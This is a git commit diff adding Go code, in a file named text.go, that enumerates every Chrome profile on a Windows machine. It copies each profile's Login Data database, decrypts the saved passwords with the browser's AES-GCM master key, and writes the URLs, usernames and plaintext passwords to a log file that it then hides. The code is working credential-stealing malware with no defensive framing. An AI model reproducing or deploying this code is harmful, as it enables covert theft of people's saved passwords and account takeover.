a75c99c5085ee7dba2e6478929e65a3572879010
Amir Mahdi Zare <83335541+amir13872@users.noreply.github.com>
2025-04-14 23:28:11 +0330

    Update text.go

--- text.go
+++ text.go
@@ -57,4 +57,114 @@ func getMasterKey() ([]byte, error) {
 
 func outBlobToBytes(blob windows.DataBlob) []byte {
 	data := make([]byte, blob.Size)
-	copy(data, (*[1 << 30]byte)(unsafe.Pointer(blob.Data))*
+	copy(data, (*[1 << 30]byte)(unsafe.Pointer(blob.Data))[:])
+	return data
+}
+
+func decryptPassword(encrypted []byte, key []byte) (string, error) {
+	if !strings.HasPrefix(string(encrypted), "v10") {
+		return "", fmt.Errorf("unsupported format")
+	}
+	encrypted = encrypted[3:]
+
+	iv := encrypted[:12]
+	ciphertext := encrypted[12 : len(encrypted)-16]
+	tag := encrypted[len(encrypted)-16:]
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return "", err
+	}
+	aesgcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return "", err
+	}
+
+	plaintext, err := aesgcm.Open(nil, iv, append(ciphertext, tag...), nil)
+	if err != nil {
+		return "", err
+	}
+	return string(plaintext), nil
+}
+
+func hideFile(path string) {
+	pChar, _ := syscall.UTF16PtrFromString(path)
+	syscall.SetFileAttributes(pChar, syscall.FILE_ATTRIBUTE_HIDDEN)
+}
+
+func main() {
+	aesKey, err := getMasterKey()
+	if err != nil {
+		return
+	}
+
+	userDataPath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
+	dirs, err := os.ReadDir(userDataPath)
+	if err != nil {
+		return
+	}
+
+	var allResults []LoginEntry
+
+	for _, dir := range dirs {
+		profilePath := filepath.Join(userDataPath, dir.Name())
+		loginDataPath := filepath.Join(profilePath, "Login Data")
+
+		if _, err := os.Stat(loginDataPath); err != nil {
+			continue
+		}
+
+		tmpPath := filepath.Join(os.TempDir(), dir.Name()+"_LoginData_copy.db")
+		input, err := os.ReadFile(loginDataPath)
+		if err != nil {
+			continue
+		}
+		os.WriteFile(tmpPath, input, 0600)
+
+		db, err := sql.Open("sqlite3", tmpPath)
+		if err != nil {
+			continue
+		}
+
+		rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins`)
+		if err != nil {
+			db.Close()
+			continue
+		}
+
+		for rows.Next() {
+			var url, username string
+			var encPwd []byte
+
+			err = rows.Scan(&url, &username, &encPwd)
+			if err != nil {
+				continue
+			}
+
+			decPwd, err := decryptPassword(encPwd, aesKey)
+			if err != nil {
+				continue
+			}
+
+			if username != "" && decPwd != "" {
+				entry := LoginEntry{
+					URL:      url,
+					Username: username,
+					Password: decPwd,
+				}
+				allResults = append(allResults, entry)
+			}
+		}
+		rows.Close()
+		db.Close()
+	}
+
+	jsonOutput, _ := json.MarshalIndent(allResults, "", "  ")
+
+	exePath, _ := os.Executable()
+	dir := filepath.Dir(exePath)
+	filePath := filepath.Join(dir, "output.log")
+
+	os.WriteFile(filePath, jsonOutput, 0600)
+	hideFile(filePath)
+}
